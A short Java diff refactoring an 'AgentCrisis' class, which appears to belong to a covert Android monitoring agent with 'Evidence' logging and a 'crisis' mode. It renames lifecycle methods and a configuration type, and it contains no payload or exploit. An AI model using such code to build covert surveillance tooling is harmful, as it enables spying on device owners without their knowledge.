@@ -14,6 +14,7 @@ import java.io.IOException;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
@@ -37,19 +38,19 @@ public class AgentCrisis extends BaseAgent {
 	private int type;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		Status.self().startCrisis();
 		Evidence.info(Messages.getString("8.0")); //$NON-NLS-1$
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		Status.self().stopCrisis();
 		Evidence.info(Messages.getString("8.2")); //$NON-NLS-1$
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 
 		Status status = Status.self();
 		try {
@@ -79,7 +80,7 @@ public class AgentCrisis extends BaseAgent {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 	}
 
 }
